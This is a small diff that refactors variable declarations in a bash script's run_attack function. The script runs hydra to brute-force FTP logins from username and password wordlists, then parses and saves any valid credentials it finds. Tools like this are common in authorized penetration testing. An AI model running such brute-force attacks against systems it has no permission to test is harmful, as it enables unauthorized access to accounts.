@@ -111,7 +111,8 @@ run_attack() {
     echo ""
     
     # Run hydra
-    local output_file=$(mktemp)
+    local output_file
+    output_file=$(mktemp)
     hydra -L "$username_file" -P "$wordlist" \
           -t $THREADS \
           -w $TIMEOUT \
@@ -121,8 +122,10 @@ run_attack() {
         
         if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
             # Parse successful login (support credentials with spaces)
-            local login=$(echo "$line" | sed -n 's/.*login: \(.*\) password:.*/\1/p')
-            local password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
+            local login
+            local password
+            login=$(echo "$line" | sed -n 's/.*login: \(.*\) password:.*/\1/p')
+            password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
             
             save_result "ftp" "$TARGET" "$login" "$password" "$PORT"
             log_success "Valid credentials found: $login:$password"
